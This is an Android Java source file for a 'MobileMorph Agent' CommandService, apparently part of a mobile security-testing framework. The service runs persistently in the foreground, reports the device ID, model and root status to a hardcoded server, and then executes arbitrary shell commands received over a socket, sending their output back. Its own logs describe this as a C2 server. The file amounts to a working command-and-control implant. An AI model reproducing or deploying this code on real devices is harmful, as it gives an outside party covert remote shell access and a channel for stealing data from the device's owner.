package com.mobilemorph.agent.services;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;

import com.mobilemorph.agent.utils.*;

import org.json.JSONObject;
import org.json.JSONException;

import java.util.Iterator;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import io.socket.client.IO;
import io.socket.client.Socket;

public class CommandService extends Service {
    private static final String TAG = "CommandService";
    private static final String SERVER_URL = "http://192.168.6.198:5000";
    private String deviceId;
    private Socket mSocket;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = getDeviceId();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "CommandService started");

        // Start foreground service if Android 8+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("morph_agent", "MobileMorph Agent", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            Notification notification = new Notification.Builder(this, "morph_agent")
                    .setContentTitle("MobileMorph Agent Running")
                    .setContentText("Monitoring device...")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .build();

            startForeground(1, notification);
        }

        // Register once (in background)
        new Thread(this::registerWithServer).start();

        // Start WebSocket connection
        setupWebSocket(SERVER_URL, deviceId);

        return Service.START_STICKY;
    }

    private String getDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private boolean checkRootAccess() {
        String[] paths = {
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/data/local/su"
        };
        for (String path : paths) {
            if (new java.io.File(path).exists()) return true;
        }
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            return (in.readLine() != null);
        } catch (Exception e) {
            return false;
        }
    }

    private void setupWebSocket(String serverUrl, String deviceId) {
        try {
            if (mSocket != null && mSocket.connected()) return;

            mSocket = IO.socket(serverUrl);
            mSocket.on(Socket.EVENT_CONNECT, args -> {
                Log.d("WS", "Connected");
                try {
                    JSONObject registration = new JSONObject();
                    registration.put("device_id", deviceId);
                    registration.put("manufacturer", Build.MANUFACTURER);
                    registration.put("model", Build.MODEL);
                    registration.put("rooted", checkRootAccess());
                    mSocket.emit("register", registration);
                } catch (Exception e) {
                    Log.e("WS", "Failed to build registration payload", e);
                }
            });

            mSocket.on("command", args -> {
                try {
                    String cmd = (String) args[0];
                    Log.d("WS", "Received command: " + cmd);
                    String result = ShellExecutor.execute(cmd);
                    JSONObject response = new JSONObject();
                    response.put("device_id", deviceId);
                    response.put("output", result);
                    mSocket.emit("command_result", response);
                } catch (Exception e) {
                    Log.e("WS", "Command handling failed", e);
                }
            });

            mSocket.connect();
        } catch (Exception e) {
            Log.e(TAG, "WebSocket setup failed", e);
        }
    }

    private void registerWithServer() {
        try {
            SharedPreferences prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE);
            if (prefs.getBoolean("registered", false)) return;

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("manufacturer", Build.MANUFACTURER);
            payload.put("rooted", checkRootAccess());

            URL url = new URL(SERVER_URL + "/register");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            if (code == 200) {
                prefs.edit().putBoolean("registered", true).apply();
                Log.d(TAG, "Agent registered successfully.");
            } else {
                Log.e(TAG, "Registration failed: " + code);
            }
        } catch (Exception e) {
            Log.e(TAG, "registerWithServer() failed", e);
        }
    }

    private void sendResult(String message) {
        try {
            JSONObject result = new JSONObject();
            result.put("device_id", deviceId);
            result.put("result", message);
            if (mSocket != null) {
                mSocket.emit("command_result", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "sendResult() failed", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "CommandService stopped.");
        if (mSocket != null) {
            mSocket.disconnect();
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static void startServer(Context ctx, int port) {
        Log.d("CommandService", "Starting C2 server on port: " + port);
        Intent intent = new Intent(ctx, CommandService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(intent);
        } else {
            ctx.startService(intent);
        }
    }

    public static void stopServer(Context ctx) {
        Log.d("CommandService", "Stopping C2 server");
        Intent intent = new Intent(ctx, CommandService.class);
        ctx.stopService(intent);
    }
}
